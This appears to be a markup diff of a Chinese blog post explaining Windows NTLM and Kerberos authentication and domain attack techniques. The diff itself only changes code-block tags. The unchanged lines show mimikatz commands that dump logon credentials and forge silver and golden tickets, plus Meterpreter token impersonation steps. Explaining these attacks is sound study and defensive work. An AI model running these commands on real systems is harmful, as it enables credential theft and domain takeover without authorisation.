@@ -112,11 +112,11 @@
 <p>在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p>
 <h3 id="ntlm-hash的产生">NTLM Hash的产生</h3>
 <p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p>
-<pre><code>admin -&gt; hex(16进制编码) = 61646d696e
+<pre tabindex="0"><code>admin -&gt; hex(16进制编码) = 61646d696e
 61646d696e -&gt; Unicode = 610064006d0069006e00
 610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
 </code></pre><h3 id="本地认证流程">本地认证流程</h3>
-<pre><code>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)
+<pre tabindex="0"><code>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)
 </code></pre><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p>
 <ul>
 <li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
@@ -127,7 +127,7 @@
 <p><strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong></p>
 <p>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p>
 <p>LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p>
-<pre><code>将所有小写字母转换为大写字母
+<pre tabindex="0"><code>将所有小写字母转换为大写字母
 • &gt;123ABC // 未达到7个字符
 • 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补
 • &gt;31323341424300000000000000
@@ -324,15 +324,15 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 <li>2.需要目标服务的NTLM Hash</li>
 </ul>
 <p>在第三步认证中的Ticket的组成:</p>
-<pre><code>Ticket=Server Hash(Server Session Key+Client info+End Time) 
+<pre tabindex="0"><code>Ticket=Server Hash(Server Session Key+Client info+End Time) 
 </code></pre><p>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p>
 <p><strong>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。
 所以，一切凭据都来源于Server Hash。</strong></p>
 <h3 id="伪造白银票据silver-tickets">伪造白银票据(Silver Tickets)</h3>
 <p>首先需要导出Server Hash：</p>
-<pre><code>C:\files&gt;mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt
+<pre tabindex="0"><code>C:\files&gt;mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt
 </code></pre><p>伪造票据:</p>
-<pre><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit
+<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit
 </code></pre><p>Other：</p>
 <ul>
 <li>kerberos::list #列出票据</li>
@@ -392,7 +392,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 </ul>
 <p>开启方式:</p>
 <p>将注册表中</p>
-<pre><code>HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters
+<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters
 </code></pre><p>中的<code>ValidateKdcPacSignature</code>设置为1。</p>
 <h3 id="黄金票据golden-tickets">黄金票据(Golden Tickets)</h3>
 <p>黄金票据特点:</p>
@@ -403,7 +403,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 <p><strong>PS:这里的krbtgt hash就是之前讲的KDC Hash</strong></p>
 <h3 id="黄金票据golden-tickets-msf-kiwi">黄金票据(Golden Tickets)-MSF kiwi</h3>
 <p>使用meterpreter中的kiwi模块：</p>
-<pre><code>load kiwi
+<pre tabindex="0"><code>load kiwi
 </code></pre><p>创建票据：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-30/0x08.png" alt="0x08.png"></p>
 <p>注入到内存：</p>
@@ -412,7 +412,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-30/0x10.png" alt="0x010.png"></p>
 <h3 id="黄金票据golden-tickets---伪造">黄金票据(Golden Tickets) - 伪造</h3>
 <p>伪造票据:</p>
-<pre><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit
+<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit
 </code></pre><h3 id="黄金票据golden-tickets---演示">黄金票据(Golden Tickets) - 演示</h3>
 <video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-30/kerberos_gtgt.mp4" controls="controls" width="500px">
 哎呀~ 换个浏览器试试吧！
@@ -477,7 +477,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 </ul>
 <p>案例(针对某跨国企业的一次渗透测试 获取DC权限）: <a href="http://blog.360ec.net/archives/32/">http://blog.360ec.net/archives/32/</a></p>
 <h3 id="windows-access-token令牌假冒实战-1">Windows Access Token令牌假冒实战</h3>
-<pre><code>meterpreter &gt; getsystem
+<pre tabindex="0"><code>meterpreter &gt; getsystem
 meterpreter &gt; load incognito meterpreter &gt; list_tokens –u
 Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
 meterpreter &gt; impersonate_token &quot;PAYLOADS\\Administrator”
